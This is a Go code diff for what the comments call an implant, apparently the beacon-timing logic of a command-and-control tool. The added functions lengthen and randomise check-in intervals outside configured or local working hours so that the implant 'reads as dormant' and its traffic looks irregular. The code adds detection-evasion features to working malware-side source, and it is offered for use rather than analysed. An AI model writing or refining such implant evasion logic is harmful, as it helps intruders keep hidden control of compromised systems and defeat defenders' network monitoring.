@@ -106,17 +106,85 @@ func computeBeaconIntervalWithMode(base time.Duration, jitterPercent float64) ti
 		return randomBase + variation
 
 	case RandomizationAdaptive:
-		// Adaptive mode combines time-of-day and network-condition awareness
-		// For now, use gaussian + time-of-day factor
-		stddev := float64(base) * jitter
+		// Adaptive genuinely modulates on the environment instead of aliasing to
+		// gaussian: outside the operator's active window (a configured working-hours
+		// window, else local business hours) the beacon lengthens and de-regularizes
+		// so the implant reads as dormant between checks; inside the window it
+		// tightens back toward the configured base. Both cases keep gaussian jitter
+		// but scale the interval and the spread, so the cadence is never as regular
+		// as plain linear jitter. Bounded to stay sane.
+		scale, spreadMul := adaptiveFactor(time.Now())
+		stddev := float64(base) * jitter * spreadMul
 		variation := time.Duration(gaussianRandom() * stddev)
-		return base + variation
+		interval := time.Duration(float64(base)*scale) + variation
+		return interval
 
 	default:
 		// Linear (default): uniform random within ±jitter% of base
 		variation := time.Duration(float64(base) * jitter * (rng.Float64()*2 - 1))
 		return base + variation
 	}
+}
+
+// adaptiveFactor returns (intervalScale, spreadMultiplier) for the adaptive
+// beacon mode given the current instant. It is a pure function of `now` and the
+// configured working-hours window so it is directly testable (it does NOT read
+// the wall clock again, which would make it non-deterministic under test).
+//
+// Active signal (highest priority): a configured working-hours window
+// (working_start AND working_end set). In-window -> (1.0, 1.0): tighten toward
+// the base and use nominal spread. Out-of-window -> (1.5, 1.6): sleep ~50%
+// longer and widen the jitter so the cadence looks dormant and irregular.
+//
+// No window configured: fall back to a local time-of-day heuristic -- local
+// business hours (09:00-17:59) -> active (1.0, 1.0); otherwise out-of-hours ->
+// (1.35, 1.4), a gentler dormant shift than an explicit out-of-window because
+// the heuristic is weaker evidence than an operator-set window.
+//
+// Bounds: scale in [1.0, 1.5], spread in [1.0, 1.6]. floorBeaconInterval and
+// applyMaxRandomCap in the caller still clamp the final duration, so a large
+// base with a high spread can never produce a runaway sleep here.
+func adaptiveFactor(now time.Time) (float64, float64) {
+	wh := getWorkingHours()
+	if wh.start != "" && wh.end != "" {
+		if withinWindowAt(now, wh) {
+			return 1.0, 1.0
+		}
+		return 1.5, 1.6
+	}
+	loc := loadWorkingTZ()
+	h := now.In(loc).Hour()
+	if h >= 9 && h < 18 {
+		return 1.0, 1.0
+	}
+	return 1.35, 1.4
+}
+
+// withinWindowAt mirrors isWithinWorkingHours but evaluates a supplied instant
+// (the beacon decision is made at `now`, and testing must control that instant).
+// A malformed or absent window reports "in window" so activity is not throttled
+// on a bad config -- the same fail-open the existing helper uses.
+func withinWindowAt(now time.Time, wh workingHoursState) bool {
+	if wh.start == "" || wh.end == "" {
+		return true
+	}
+	loc := loadWorkingTZ()
+	local := now.In(loc)
+	startTime, err := time.ParseInLocation("15:04", wh.start, loc)
+	if err != nil {
+		return true
+	}
+	endTime, err := time.ParseInLocation("15:04", wh.end, loc)
+	if err != nil {
+		return true
+	}
+	cur := local.Hour()*60 + local.Minute()
+	s := startTime.Hour()*60 + startTime.Minute()
+	e := endTime.Hour()*60 + endTime.Minute()
+	if s <= e {
+		return cur >= s && cur < e
+	}
+	return cur >= s || cur < e
 }
 
 // applyMaxRandomCap clamps the computed interval if MaxRandomIntervalMs is set.
